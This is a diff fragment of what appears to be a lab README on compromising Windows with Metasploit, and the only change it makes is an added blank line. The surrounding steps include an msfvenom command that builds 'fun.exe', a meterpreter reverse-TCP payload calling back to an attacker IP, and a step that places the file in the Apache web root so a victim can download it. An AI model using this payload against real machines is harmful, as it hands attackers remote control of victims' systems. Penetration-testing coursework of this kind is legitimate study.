@@ -26,6 +26,7 @@ Find the attackers ip address using ifconfig 322251922-6e11e35c-4c2c-4b7f-b903-5
 ![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/104eab8b-3fb7-48fe-ade0-31243e195d81)
 
 Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe 
+
 ![image](https://github.com/Naadira/Compromising-windows-using-Metasploit/assets/128135126/0df0e815-1019-49e3-996b-43e70ba70201)
 
 copy the fun.exe into the apache /var/www/html folder
